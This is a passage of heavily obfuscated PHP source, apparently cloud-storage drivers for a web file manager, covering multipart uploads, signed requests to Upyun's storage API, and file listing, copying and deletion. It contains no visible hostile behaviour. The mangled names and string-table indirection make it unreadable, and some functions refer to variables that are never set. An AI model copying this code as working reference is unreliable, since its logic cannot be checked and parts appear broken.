$Êó©¡í); $¥ÆÁ”Ç = array($³ºĞ÷ù[215] => $³ºĞ÷ù[12], $³ºĞ÷ù[1366] => $³ºĞ÷ù[12], $³ºĞ÷ù[1322] => $ƒÁ•¼ ±, $³ºĞ÷ù[1326] => $ÆÕ‡ß, $³ºĞ÷ù[1330] => $¹Øó Ÿç, $³ºĞ÷ù[1367] => $©üü¦½, $³ºĞ÷ù[1368] => $©§œ™¹÷, $³ºĞ÷ù[1369] => $„ÔÆµ²Ó, $³ºĞ÷ù[1370] => $”¥–İ«µ, $³ºĞ÷ù[1371] => $ºùË„†, $³ºĞ÷ù[182] => $this->getHost()); return $¥ÆÁ”Ç; } public function multiUploadFormData($Æ¢şÒò, $¹ßé¿‚ö = 3600) { $á™˜ªóô =& $_SERVER[­á Ş³Ö]; $èÑÊ¤Êµ = gmdate($á™˜ªóô[1450]); $²‰üÆøı = array(); $¿•ÉêûÊ = $this->client->getUploadId($this->bucket, $Æ¢şÒò, $²‰üÆøı); if (!$¿•ÉêûÊ) { return !1; } return array($á™˜ªóô[223] => $¿•ÉêûÊ, $á™˜ªóô[182] => $this->getHost() . $á™˜ªóô[8] . $this->pathEncode($Æ¢şÒò), $á™˜ªóô[224] => $èÑÊ¤Êµ, $á™˜ªóô[94] => $Æ¢şÒò); } public function multiUploadAuthData($ä±©×ñ, $¥ÔöºŞù = array()) { $ŸÍé¿ŞÙ =& $_SERVER[­á Ş³Ö]; $Å‘Ïƒ = isset($¥ÔöºŞù[$ŸÍé¿ŞÙ[174]]) ? $¥ÔöºŞù[$ŸÍé¿ŞÙ[174]] : $ŸÍé¿ŞÙ[12]; $È±Æ¾ğÂ = $¥ÔöºŞù[$ŸÍé¿ŞÙ[94]]; unset($¥ÔöºŞù[$ŸÍé¿ŞÙ[94]]); if (isset($¥ÔöºŞù[$ŸÍé¿ŞÙ[225]])) { return $this->listUploadParts($È±Æ¾ğÂ, $¥ÔöºŞù); } $Üˆ­„ñã = array(); if (isset($¥ÔöºŞù[$ŸÍé¿ŞÙ[1451]])) { $Üˆ­„ñã[$ŸÍé¿ŞÙ[1452]] = $¥ÔöºŞù[$ŸÍé¿ŞÙ[1451]]; } $·¦¾ò å = explode($ŸÍé¿ŞÙ[184], $this->getHost()); $‡Ø¡öƒä = array($ŸÍé¿ŞÙ[1453] => $·¦¾ò å[1], $ŸÍé¿ŞÙ[1454] => $ŸÍé¿ŞÙ[12], $ŸÍé¿ŞÙ[215] => $ŸÍé¿ŞÙ[120], $ŸÍé¿ŞÙ[1366] => $¥ÔöºŞù[$ŸÍé¿ŞÙ[76]]); $áöÅé¤ƒ = $ŸÍé¿ŞÙ[228]; $©€•ç¶ç = $ŸÍé¿ŞÙ[8] . $this->pathEncode($È±Æ¾ğÂ) . $Å‘Ïƒ; $éÆ«±˜Ô = $this->client->__getSignatureV4($Üˆ­„ñã, $‡Ø¡öƒä, $áöÅé¤ƒ, $©€•ç¶ç); if (strpos($Å‘Ïƒ, $ŸÍé¿ŞÙ[227]) === 0) { if (isset($Üˆ­„ñã[$ŸÍé¿ŞÙ[1452]])) { $¨ÙÉˆÕù = $Üˆ­„ñã[$ŸÍé¿ŞÙ[1452]]; } else { if (isset($éÆ«±˜Ô[$ŸÍé¿ŞÙ[1452]])) { $¨ÙÉˆÕù = $éÆ«±˜Ô[$ŸÍé¿ŞÙ[1452]]; } else { $¨ÙÉˆÕù = hash($ŸÍé¿ŞÙ[1364], $ŸÍé¿ŞÙ[12]); } } return array($ŸÍé¿ŞÙ[234] => $éÆ«±˜Ô[$ŸÍé¿ŞÙ[234]], $ŸÍé¿ŞÙ[1452] => $¨ÙÉˆÕù, $ŸÍé¿ŞÙ[224] => $éÆ«±˜Ô[$ŸÍé¿ŞÙ[1455]]); } return $éÆ«±˜Ô[$ŸÍé¿ŞÙ[234]]; } public function listUploadParts($ø®“ë¿, $Ä¦î·¦ = array()) { $óàİëöÈ =& $_SERVER[­á Ş³Ö]; $“²Ûß¶Õ = str_replace($óàİëöÈ[235], $óàİëöÈ[12], $Ä¦î·¦[$óàİëöÈ[174]]); $ª§ÙºŠÌ = $this->client->listParts($this->bucket, $ø®“ë¿, $“²Ûß¶Õ); if (!$ª§ÙºŠÌ) { return !1; } $äÎÍáòƒ = $óàİëöÈ[1456]; foreach ($ª§ÙºŠÌ as $†Îéµûç) { $äÎÍáòƒ .= $óàİëöÈ[1457] . "\x3c\120\x61\162\x74\x4e\165\x6d\142\145\x72\76{$†Îéµûç[$óàİëöÈ[1411]]}\74\x2f\x50\141\x72\164\116\x75\x6d\142\145\x72\x3e\xa" . "\x3c\x45\124\141\147\x3e{$†Îéµûç[$óàİëöÈ[1412]]}\x3c\x2f\x45\124\141\x67\x3e\xa" . $óàİëöÈ[1458]; } $äÎÍáòƒ .= $óàİëöÈ[1459]; $ˆ—ëšŒ = array(); $åâØôİ = explode($óàİëöÈ[184], $this->getHost()); $­ùÍù€í = array($óàİëöÈ[1453] => $åâØôİ[1], $óàİëöÈ[215] => $óàİëöÈ[120], $óàİëöÈ[1366] => strlen($äÎÍáòƒ)); $şˆé±“÷ = $óàİëöÈ[226]; $ñ¦˜œ’œ = $óàİëöÈ[8] . $this->pathEncode($ø®“ë¿) . $Ä¦î·¦[$óàİëöÈ[174]]; $ëñù™Õ¾ = $this->client->__getSignatureV4($ˆ—ëšŒ, $­ùÍù€í, $şˆé±“÷, $ñ¦˜œ’œ, $äÎÍáòƒ); return array($óàİëöÈ[234] => $ëñù™Õ¾[$óàİëöÈ[234]], $óàİëöÈ[224] => $ëñù™Õ¾[$óàİëöÈ[1455]], $óàİëöÈ[236] => $ª§ÙºŠÌ, $óàİëöÈ[1452] => $ëñù™Õ¾[$óàİëöÈ[1452]]); } public function link($‰¨§Ñõ†, $÷Ì€Îê = array()) { return parent::link($‰¨§Ñõ†, $÷Ì€Îê); } public function fileOut($Êµ£¼¨½, $—¤‹õ„ = false, $ÓÁëí¯ = false, $¿ÆŸÃƒ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[­á Ş³Ö][1460])) { return parent::fileOutServer($Êµ£¼¨½, $—¤‹õ„, $ÓÁëí¯, $¿ÆŸÃƒ); } parent::fileOut($Êµ£¼¨½, $—¤‹õ„, $ÓÁëí¯, $¿ÆŸÃƒ); } public function fileOutImage($›‰õÄ©¸, $§ŞÆ”ş = 250) { if (strstr($this->endpoint, $_SERVER[­á Ş³Ö][1460])) { return parent::fileOutImageServer($›‰õÄ©¸, $§ŞÆ”ş); } parent::fileOutImage($›‰õÄ©¸, $§ŞÆ”ş); } public function fileOutLink($ü«ª»¸â) { $ô”™©£´ =& $_SERVER[­á Ş³Ö]; if (substr($ü«ª»¸â, 0, 7) == $ô”™©£´[1333]) { $ü«ª»¸â = $ô”™©£´[1334] . substr($ü«ª»¸â, 7); } header($ô”™©£´[161] . $ü«ª»¸â); die; } public function getHost() { $ŸèÑåû· =& $_SERVER[­á Ş³Ö]; $Ç¹°¾‹ = str_rtrim(parent::getHost(), $ŸèÑåû·[8] . $this->bucket); $Ç¹°¾‹ = explode($ŸèÑåû·[184], $Ç¹°¾‹); return $Ç¹°¾‹[0] . $ŸèÑåû·[184] . $this->bucket . $ŸèÑåû·[10] . $Ç¹°¾‹[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($®ÑÏÚ¬©, $İ€÷û½ü = 0) { parent::__construct(); $this->source = $®ÑÏÚ¬©; $this->sourceSize = $İ€÷û½ü; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÂÉÂ€Å = false) { return $this->sourceSize; } public function getContent($´¶‚ê„ = false) { return $this->fileSubstr($´¶‚ê„, 0, $this->sourceSize); } public function fileSubstr($ûÈª‡ˆ— = false, $Å¤Ò¢´¹ = 0, $ÛÍŠü‹¯ = 0) { if (!$ÛÍŠü‹¯) { $ÛÍŠü‹¯ = $this->sourceSize; } $—’¡ã° = $this->sourceSize - $Å¤Ò¢´¹; if ($ÛÍŠü‹¯ >= $—’¡ã°) { $ÛÍŠü‹¯ = $—’¡ã°; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Å¤Ò¢´¹, $ÛÍŠü‹¯); } if ($this->sourceType == self::TYPE_FILE) { if ($ÛÍŠü‹¯ <= 0) { return $_SERVER[­á Ş³Ö][12]; } $¤ˆµ·‡» = ftell($this->source); fseek_64($this->source, $¤ˆµ·‡» + $Å¤Ò¢´¹); $ºÚíœÕá = @fread($this->source, $ÛÍŠü‹¯); fseek_64($this->source, $¤ˆµ·‡»); return $ºÚíœÕá; } } public function hashMd5($³˜È¨® = false) { return md5($this->getContent()); } public static function hash($³¦¬ıÏ„, $ÆûÍ¦ğ¢ = 0) { $åÙ¸°ª¼ = new PathDriverStream($³¦¬ıÏ„, $ÆûÍ¦ğ¢); return $åÙ¸°ª¼->hashSimple($³¦¬ıÏ„); } public static function md5($¯‚şä½¥, $ï‘íŞåÏ = 0) { $ÄÆâ¿Æ„ = new PathDriverStream($¯‚şä½¥, $ï‘íŞåÏ); return $ÄÆâ¿Æ„->hashMd5($¯‚şä½¥); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\72\x2f\57\166\x30\x2e\x61\160\x69\56\165\160\x79\x75\156\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ş” éå») { parent::__construct(); $this->_init($Ş” éå»); } public function _init($Ş“ÁåöÒ) { $šƒçÏ±Ÿ =& $_SERVER[­á Ş³Ö]; foreach ($Ş“ÁåöÒ as $Îñ©§æ => $ğåª¨Ú) { if (isset($this->{$Îñ©§æ})) { $this->{$Îñ©§æ} = $ğåª¨Ú; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($šƒçÏ±Ÿ[1461] . LNG($šƒçÏ±Ÿ[1392])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($™û€ğø, $Ï•ÄÛª¹ = "\107\105\124") { $×­óÆ =& $_SERVER[­á Ş³Ö]; $®¥ÃäÔ‘ = gmdate($×­óÆ[1425]); $ ùÆßæ” = base64_encode(hash_hmac($×­óÆ[1462], "{$Ï•ÄÛª¹}\46{$™û€ğø}\46{$®¥ÃäÔ‘}", md5("{$this->userpass}"), !0)); $£–‘‡ÃŸ = array("\x41\x75\x74\x68\157\x72\x69\x7a\141\x74\x69\157\156\x3a\125\x50\x59\x55\x4e\40{$this->username}\72{$ ùÆßæ”}", "\x44\x61\164\x65\72{$®¥ÃäÔ‘}"); return $£–‘‡ÃŸ; } public function ussRequest($ù’ÈÚè˜, $Û²õ¼Æ = "\107\x45\x54", $ùË°¡—­ = false, $³øÇ·‚ã = false, $£¬Ùôµ = false) { $¨µÕˆ =& $_SERVER[­á Ş³Ö]; $ù’ÈÚè˜ = trim($ù’ÈÚè˜, $¨µÕˆ[8]); $ü®œ‹Üğ = "\x2f{$this->bucket}\x2f{$ù’ÈÚè˜}"; $Ãâ‰‚½ô = $this->ussHeaders($ü®œ‹Üğ, $Û²õ¼Æ); if ($³øÇ·‚ã) { $Ãâ‰‚½ô = array_merge($Ãâ‰‚½ô, $³øÇ·‚ã); } $ŠÃÄ®àå = url_request($this->endpoint . $ü®œ‹Üğ, $Û²õ¼Æ, $ùË°¡—­, $Ãâ‰‚½ô, $£¬Ùôµ); if (!$ŠÃÄ®àå) { return array($¨µÕˆ[1208] => !1, $¨µÕˆ[1198] => $¨µÕˆ[1463]); } if (strtolower($Û²õ¼Æ) == $¨µÕˆ[197] || in_array($ŠÃÄ®àå[$¨µÕˆ[1208]], array($¨µÕˆ[1318], $¨µÕˆ[1464]))) { $ùË°¡—­ = $ŠÃÄ®àå[$¨µÕˆ[1465]]; } else { $ùË°¡—­ = json_decode($ŠÃÄ®àå[$¨µÕˆ[1198]], !0); if (!$ùË°¡—­) { $ùË°¡—­ = $ŠÃÄ®àå[$¨µÕˆ[1198]]; } else { if (!$ŠÃÄ®àå[$¨µÕˆ[746]] && isset($ùË°¡—­[$¨µÕˆ[1466]])) { $ùË°¡—­ = $ùË°¡—­[$¨µÕˆ[1466]]; } } } return array($¨µÕˆ[1208] => $ŠÃÄ®àå[$¨µÕˆ[746]], $¨µÕˆ[1198] => $ùË°¡—­); } public function mkfile($¯Æ¯ûİ, $³‡ì‹×ò = '', $úëĞ¨ë‘ = REPEAT_RENAME) { if ($this->setContent($¯Æ¯ûİ, $³‡ì‹×ò)) { return $this->getPathOuter($¯Æ¯ûİ); } return !1; } public function mkdir($‹İ—µ¹, $ÕòèÅÛ´ = REPEAT_SKIP) { $½Ÿ»ŞÄÏ =& $_SERVER[­á Ş³Ö]; $µ€È¤îÍ = trim($‹İ—µ¹, $½Ÿ»ŞÄÏ[8]); if ($this->_isFolder($µ€È¤îÍ)) { return $this->getPathOuter($µ€È¤îÍ); } $ü±¨‰›¦ = array($½Ÿ»ŞÄÏ[1467]); $Æò‰´ = $this->ussRequest($µ€È¤îÍ, $½Ÿ»ŞÄÏ[226], !1, $ü±¨‰›¦); return $Æò‰´[$½Ÿ»ŞÄÏ[1208]] ? $this->getPathOuter($µ€È¤îÍ) : !1; } public function copyFile($Œğó‚‹‹, $Êãû¦) { $¸ˆËßìØ =& $_SERVER[­á Ş³Ö]; $—Ç·Ã¶á = array($¸ˆËßìØ[1468] . "\57{$this->bucket}\x2f{$Œğó‚‹‹}", $¸ˆËßìØ[1469]); $‚ìâìøç = $this->ussRequest($Êãû¦, $¸ˆËßìØ[228], !1, $—Ç·Ã¶á); return $‚ìâìøç[$¸ˆËßìØ[1208]] ? !0 : $this->getPathOuter($Êãû¦); } public function moveFile($µ·™éÏË, $…àÁñÁÛ) { $™Âœö»± =& $_SERVER[­á Ş³Ö]; $œ°”Õœ‡ = array($™Âœö»±[1470] . "\57{$this->bucket}\57{$µ·™éÏË}", $™Âœö»±[1469]); $•üÛù = $this->ussRequest($…àÁñÁÛ, $™Âœö»±[228], !1, $œ°”Õœ‡); return $•üÛù[$™Âœö»±[1208]] ? !0 : $this->getPathOuter($…àÁñÁÛ); } public function delFile($ù¡áÍ± ) { $ÓäöØ…ğ =& $_SERVER[­á Ş³Ö]; $€ó»Óßò = $this->ussRequest($ù¡áÍ± , $ÓäöØ…ğ[1471]); return $€ó»Óßò[$ÓäöØ…ğ[1208]] ? !0 : !1; } public function delFolder($è±¿ÎŸ) { $ºğõÂºå =& $_SERVER[­á Ş³Ö]; if (!$this->exist($è±¿ÎŸ)) { return !0; } $this->listItemCache = !1; $×ë± ÎÂ = $İÔÜÚ£¥ = array(); $this->fileList($è±¿ÎŸ, $×ë± ÎÂ, $İÔÜÚ£¥, !0); $this->listItemCache = !0; foreach ($İÔÜÚ£¥ as $ˆéçã²à) { $“÷¶ ·À = $this->ussRequest($ˆéçã²à[$ºğõÂºå[32]], $ºğõÂºå[1471]); if (!$“÷¶ ·À[$ºğõÂºå[1208]]) { return !1; } } foreach ($×ë± ÎÂ as $ÚöĞ²¹ò) { $“÷¶ ·À = $this->ussRequest($ÚöĞ²¹ò, $ºğõÂºå[1471]); if (!$“÷¶ ·À[$ºğõÂºå[1208]]) { return !1; } } $“÷¶ ·À = $this->ussRequest($è±¿ÎŸ, $ºğõÂºå[1471]); return $“÷¶ ·À[$ºğõÂºå[1208]]; } public function rename($¾Ïœ—Œî, $ˆÛÜìö€) { if ($this->isFile($¾Ïœ—Œî)) { $ˆÛÜìö€ = get_path_father($¾Ïœ—Œî) . $ˆÛÜìö€; return $this->moveFile($¾Ïœ—Œî, $ˆÛÜìö€); } return $this->renameObject($¾Ïœ—Œî, $ˆÛÜìö€); } public function fileInfo($ÂƒÑàÀ, $ğ’äŒ‰µ = false, $Êöã¾¨½ = array()) { $µ‰—ç®² =& $_SERVER[­á Ş³Ö]; $Ç®–ºâ‰ = array($µ‰—ç®²[32] => $this->pathThis($ÂƒÑàÀ), $µ‰—ç®²[84] => $this->getPathOuter($µ‰—ç®²[8] . $ÂƒÑàÀ), $µ‰—ç®²[33] => $µ‰—ç®²[200], $µ‰—ç®²[76] => isset($Êöã¾¨½[$µ‰—ç®²[76]]) ? $Êöã¾¨½[$µ‰—ç®²[76]] : 0, $µ‰—ç®²[174] => $this->ext($ÂƒÑàÀ)); if ($ğ’äŒ‰µ) { return $Ç®–ºâ‰; } $Ç®–ºâ‰[$µ‰—ç®²[201]] = $Ç®–ºâ‰[$µ‰—ç®²[85]] = 0; $Ç®–ºâ‰[$µ‰—ç®²[202]] = $Ç®–ºâ‰[$µ‰—ç®²[203]] = !0; if (empty($Êöã¾¨½)) { $Êöã¾¨½ = $this->objectMeta($ÂƒÑàÀ); if (!$Êöã¾¨½) { return $Ç®–ºâ‰; } } $Ç®–ºâ‰[$µ‰—ç®²[201]] = intval($Êöã¾¨½[$µ‰—ç®²[1472]]); $Ç®–ºâ‰[$µ‰—ç®²[85]] = intval($Êöã¾¨½[$µ‰—ç®²[1473]]); $Ç®–ºâ‰[$µ‰—ç®²[76]] = $Êöã¾¨½[$µ‰—ç®²[76]]; return $Ç®–ºâ‰; } public function folderInfo($¾ÌÕ™±Ü, $Ÿ¼À¤ŠÀ = false) { $ÔÖä£Â =& $_SERVER[­á Ş³Ö]; $ı½ˆ²²– = array($ÔÖä£Â[32] => $this->pathThis($¾ÌÕ™±Ü), $ÔÖä£Â[84] => $this->getPathOuter($ÔÖä£Â[8] . $¾ÌÕ™±Ü), $ÔÖä£Â[33] => $ÔÖä£Â[75]); if ($Ÿ¼À¤ŠÀ) { return $ı½ˆ²²–; } $ı½ˆ²²–[$ÔÖä£Â[201]] = $ı½ˆ²²–[$ÔÖä£Â[85]] = 0; $ı½ˆ²²–[$ÔÖä£Â[202]] = $ı½ˆ²²–[$ÔÖä£Â[203]] = !0; if (empty($ÏÙâö£§)) { $ÏÙâö£§ = $this->objectMeta($¾ÌÕ™±Ü); if (!$ÏÙâö£§) { return $ı½ˆ²²–; } } $ı½ˆ²²–[$ÔÖä£Â[201]] = intval($ÏÙâö£§[$ÔÖä£Â[1472]]); $ı½ˆ²²–[$ÔÖä£Â[85]] = intval($ÏÙâö£§[$ÔÖä£Â[1473]]); return $ı½ˆ²²–; } private function listObjs($ÄÖÂ¸²§, $€ÖÛ³İµ = 0, $º¾ˆ¾úÅ = 1000) { $€İ¨ÏÖÙ =& $_SERVER[­á Ş³Ö]; $§ Â‚ş· = array($€İ¨ÏÖÙ[1474], $€İ¨ÏÖÙ[1475] . $º¾ˆ¾úÅ); if ($€ÖÛ³İµ) { $§ Â‚ş·[] = $€İ¨ÏÖÙ[1476] . $€ÖÛ³İµ; } $´È«ãÂ¹ = $this->ussRequest($ÄÖÂ¸²§, $€İ¨ÏÖÙ[230], !1, $§ Â‚ş·); return !$´È«ãÂ¹[$€İ¨ÏÖÙ[1208]] ? !1 : $´È«ãÂ¹[$€İ¨ÏÖÙ[1198]]; } private function fileList($šéÚ©æŒ, &$¥ÀËÈ¸õ, &$¦´‚»œ¡, $ê›­¯ı = false) { $ïØ¯½ =& $_SERVER[­á Ş³Ö]; $øŒË£×œ = $ïØ¯½[12]; $İÕû˜œ = 1000; $ßœÉöÇ¬ = rtrim($šéÚ©æŒ, $ïØ¯½[8]) . $ïØ¯½[8]; while (!0) { check_abort(); $‰ÛıÈ«ç = $this->listObjs($šéÚ©æŒ, $øŒË£×œ, $İÕû˜œ); if (!$‰ÛıÈ«ç) { return !1; } $øŒË£×œ = isset($‰ÛıÈ«ç[$ïØ¯½[1477]]) ? $‰ÛıÈ«ç[$ïØ¯½[1477]] : $ïØ¯½[12]; $éÓ‘¤ù† = isset($‰ÛıÈ«ç[$ïØ¯½[1478]]) ? $‰ÛıÈ«ç[$ïØ¯½[1478]] : array(); foreach ($éÓ‘¤ù† as $â¥û“üÍ) { $‹ºÙ÷ïÛ = $â¥û“üÍ[$ïØ¯½[33]] == $ïØ¯½[75] ? !0 : !1; $Ë¤‡Šæ… = ltrim($ßœÉöÇ¬ . $â¥û“üÍ[$ïØ¯½[32]], $ïØ¯½[8]) . ($‹ºÙ÷ïÛ ? $ïØ¯½[8] : $ïØ¯½[12]); $şı°Şé† = array($ïØ¯½[32] => $Ë¤‡Šæ…, $ïØ¯½[33] => $‹ºÙ÷ïÛ ? $ïØ¯½[75] : $ïØ¯½[200], $ïØ¯½[76] => $â¥û“üÍ[$ïØ¯½[337]], $ïØ¯½[1473] => $â¥û“üÍ[$ïØ¯½[1479]]); $this->cacheMethodInfoSet($Ë¤‡Šæ…, $‹ºÙ÷ïÛ, $şı°Şé†); if ($‹ºÙ÷ïÛ) { $¥ÀËÈ¸õ[] = $Ë¤‡Šæ…; if ($ê›­¯ı) { $this->fileList($Ë¤‡Šæ…, $¥ÀËÈ¸õ, $¦´‚»œ¡, $ê›­¯ı); } continue; } $¦´‚»œ¡[] = $şı°Şé†; } if (count($éÓ‘¤ù†) < $İÕû˜œ) { break; } } $this->cacheMethodInfoSet($šéÚ©æŒ, !0); } public function listPath($ùÎ¯’ª‹, $ôØõŸ = false) { $‚›ÒÒ’• =& $_SERVER[­á Ş³Ö]; $­÷«ñû = $Ì …Õ— = array(); $this->fileList($ùÎ¯’ª‹, $­÷«ñû, $Ì …Õ—); foreach ($­÷«ñû as $©ƒä´©œ => $£Â½¤õÆ) { $­÷«ñû[$©ƒä´©œ] = $this->folderInfo($£Â½¤õÆ, $ôØõŸ); } foreach ($Ì …Õ— as $©ƒä´©œ => $£Â½¤õÆ) { $Ì …Õ—[$©ƒä´©œ] = $this->fileInfo($£Â½¤õÆ[$‚›ÒÒ’•[32]], $ôØõŸ, $£Â½¤õÆ); } return array($‚›ÒÒ’•[82] => $­÷«ñû, $‚›ÒÒ’•[83] => $Ì …Õ—); } public function has($Ü½ÑÒÎË, $¹©£ÕƒŞ = false, $Ìû€ƒ›¨ = true) { $–ê˜–ş„ =& $_SERVER[­á Ş³Ö]; $Ë²Ÿš«¬ = $–ê˜–ş„[12]; $¯Ò‡åö— = 500; $¾’•€ÛÑ = 0; $ˆµÂÁÚô = 0; $²ÚØµÑº = rtrim($Ü½ÑÒÎË, $–ê˜–ş„[8]) . $–ê˜–ş„[8]; while (!0) { check_abort(); $•Ü©ƒØ = $this->listObjs($Ü½ÑÒÎË, $Ë²Ÿš«¬, $¯Ò‡åö—); if (!$•Ü©ƒØ) { return !1; } $Ë²Ÿš«¬ = isset($•Ü©ƒØ[$–ê˜–ş„[1477]]) ? $•Ü©ƒØ[$–ê˜–ş„[1477]] : $–ê˜–ş„[12]; $ÏòèÇ‹­ = isset($•Ü©ƒØ[$–ê˜–ş„[1478]]) ? $•Ü©ƒØ[$–ê˜–ş„[1478]] : array(); if (empty($ÏòèÇ‹­)) { break; } $Áü– ¸Î = array_filter($ÏòèÇ‹­, function ($¤¹¼€¹È) { $¨áŞæÄ› =& $_SERVER[­á Ş³Ö]; return $¤¹¼€¹È[$¨áŞæÄ›[33]] == $¨áŞæÄ›[75]; }); $ïÍÀòÔ™ = count($ÏòèÇ‹­); $Áü– ¸Î = count($Áü– ¸Î); $»ß“¹Ï† = $ïÍÀòÔ™ - $Áü– ¸Î; if ($¹©£ÕƒŞ) { $ˆµÂÁÚô += $Áü– ¸Î; $¾’•€ÛÑ += $»ß“¹Ï†; if ($ïÍÀòÔ™ < $¯Ò‡åö—) { break; } continue; } if ($Ìû€ƒ›¨) { if ($»ß“¹Ï†) { return !0; } } else { if ($Áü– ¸Î) { return !0; } } if ($ïÍÀòÔ™ < $¯Ò‡åö—) { break; } } if ($¹©£ÕƒŞ) { return array($–ê˜–ş„[207] => $¾’•€ÛÑ, $–ê˜–ş„[208] => $ˆµÂÁÚô); } return !1; } public function listAll($‘Ïİøòú) { $Ó¾³æËú =& $_SERVER[­á Ş³Ö]; $´¥Æ€¤ä = $Ï„àİÜÖ = array(); $this->fileList($‘Ïİøòú, $´¥Æ€¤ä, $Ï„àİÜÖ, !0); $ŠŠò„ã‚ = array_to_keyvalue($Ï„àİÜÖ, $Ó¾³æËú[32]); foreach ($´¥Æ€¤ä as $•Ò‚ªÛ) { if (is_string($•Ò‚ªÛ)) { $ŠŠò„ã‚[$•Ò‚ªÛ] = array($Ó¾³æËú[76] => 0); } } return $this->listAllFiles($‘Ïİøòú, $ŠŠò„ã‚); } public function canRead($ß¶Ì…ãÓ) { return $this->exist($ß¶Ì…ãÓ) ? !0 : !1; } public function canWrite($¢•€×) { return $this->exist($¢•€×) ? !0 : !1; } public function getContent($ÕŸ£©’) { return $this->fileSubstr($ÕŸ£©’, 0, -1); } public function setContent($£öÈÏƒ×, $…ˆº×æ¡ = '') { $¾ñ¯Ø¡œ =& $_SERVER[­á Ş³Ö]; if (!$…ˆº×æ¡) { $¸¯ÅÂ·ó = $this->ussRequest($£öÈÏƒ×, $¾ñ¯Ø¡œ[226]); return $¸¯ÅÂ·ó[$¾ñ¯Ø¡œ[1208]]; } $ƒ±àÇ²» = $this->tempFile($this->pathThis($£öÈÏƒ×)); file_put_contents($ƒ±àÇ²», $…ˆº×æ¡); if ($this->upload($£öÈÏƒ×, $ƒ±àÇ²»)) { $this->tempFileRemve($ƒ±àÇ²»); return !0; } return !1; } public function fileSubstr($™¼Â¢ç, $¨‚«¾–Ù, $ƒäğèß¯) { $Œ§Œ×¶ =& $_SERVER[­á Ş³Ö]; if (!($ÖĞ¿¦êŒ = $this->link($™¼Â¢ç))) { return !1; } $òÉãó”– = !1; if ($ƒäğèß¯ > 0) { $Œ§ØµŞ = $¨‚«¾–Ù + $ƒäğèß¯ - 1; $òÉãó”– = array($Œ§Œ×¶[1440] . $¨‚«¾–Ù . $Œ§Œ×¶[386] . $Œ§ØµŞ); } $ìğ¢Ê‘Œ = url_request($ÖĞ¿¦êŒ, $Œ§Œ×¶[230], !1, $òÉãó”–); return $ìğ¢Ê‘Œ[$Œ§Œ×¶[746]] ? $ìğ¢Ê‘Œ[$Œ§Œ×¶[1198]] : !1; } public function upload($ŒğÎ´Í, $ßó§§•, $õˆ©‡û± = false, $ÇºÎ²È² = REPEAT_REPLACE) { $ñ¿˜÷Ú =& $_SERVER[­á Ş³Ö]; $–¶öÜÀ = IO::size($ßó§§•); if ($–¶öÜÀ <= 1024 * 1024 * 200) { $˜ôÃó½Å = array($ñ¿˜÷Ú[1480] . $ßó§§•); $æ¿ğõ¬§ = $this->ussRequest($ŒğÎ´Í, $ñ¿˜÷Ú[228], $˜ôÃó½Å); return $æ¿ğõ¬§[$ñ¿˜÷Ú[1208]] ? $this->getPathOuter($ŒğÎ´Í) : !1; } $Ğ½¢ÍÎç = 1024 * 1024 * 10; $ÀÓ‚ËÈÛ = array($ñ¿˜÷Ú[1481], $ñ¿˜÷Ú[1482] . $–¶öÜÀ, $ñ¿˜÷Ú[1483], $ñ¿˜÷Ú[1484] . $Ğ½¢ÍÎç); $æ¿ğõ¬§ = $this->ussRequest($ŒğÎ´Í, $ñ¿˜÷Ú[228], !1, $ÀÓ‚ËÈÛ); if (!$æ¿ğõ¬§[$ñ¿˜÷Ú[1208]]) { return !1; } $„€íà÷º = $æ¿ğõ¬§[$ñ¿˜÷Ú[1198]]; $Ùü¶ĞÊ  = 0; $²–Ó€±Õ = $„€íà÷º[$ñ¿˜÷Ú[1485]]; $ÖĞ¢ßª = fopen($ßó§§•, $ñ¿˜÷Ú[1389]); if (!$ÖĞ¢ßª) { return !1; } do { $·¼Ë¤ = $„€íà÷º[$ñ¿˜÷Ú[1486]]; fseek_64($ÖĞ¢ßª, $Ùü¶ĞÊ ); $Ğ€ñ¶¨„ = fread($ÖĞ¢ßª, $·¼Ë¤); $á·‹¿™î = 0; do { $á·‹¿™î++; $„€íà÷º = $this->uploadPart($ŒğÎ´Í, $„€íà÷º, $Ğ€ñ¶¨„); } while (!$„€íà÷º && $á·‹¿™î < 3); if (!$„€íà÷º) { return !1; } $²–Ó€±Õ = $„€íà÷º[$ñ¿˜÷Ú[1485]]; $Ùü¶ĞÊ  += $·¼Ë¤; } while ($²–Ó€±Õ != -1); fclose($ÖĞ¢ßª); $ÀÓ‚ËÈÛ = array($ñ¿˜÷Ú[1487], $ñ¿˜÷Ú[1488] . $„€íà÷º[$ñ¿˜÷Ú[1489]], $ñ¿˜÷Ú[1483]); $æ¿ğõ¬§ = $this->ussRequest($ŒğÎ´Í, $ñ¿˜÷Ú[228], !1, $ÀÓ‚ËÈÛ); return $æ¿ğõ¬§[$ñ¿˜÷Ú[1208]] ? $this->getPathOuter($ë¸ÈÒ€¹) : !1; } private function uploadPart($ŸğĞÂ¶, $‡Öåá¥¤, &$‰ÄÓ„÷å) { $Ïˆ“öëî =& $_SERVER[­á Ş³Ö]; $Ë×Šõîì = array($Ïˆ“öëî[1490], $Ïˆ“öëî[1488] . $‡Öåá¥¤[$Ïˆ“öëî[1489]], $Ïˆ“öëî[1491] . $‡Öåá¥¤[$Ïˆ“öëî[1485]], $Ïˆ“öëî[142] . $‡Öåá¥¤[$Ïˆ“öëî[1486]]); $åÀÅğàÛ = $this->ussRequest($ŸğĞÂ¶, $Ïˆ“öëî[228], $‰ÄÓ„÷å, $Ë×Šõîì); return !$åÀÅğàÛ[$Ïˆ“öëî[1208]] ? $åÀÅğàÛ[$Ïˆ“öëî[1208]] : $åÀÅğàÛ[$Ïˆ“öëî[1198]]; } public function uploadFormData($Íù×ö«š, $¡ƒ½‚³ú = 3600) { return $this->uploadPolicy($Íù×ö«š, $¡ƒ½‚³ú); } public function multiUploadFormData($€Ò“Ğ„, 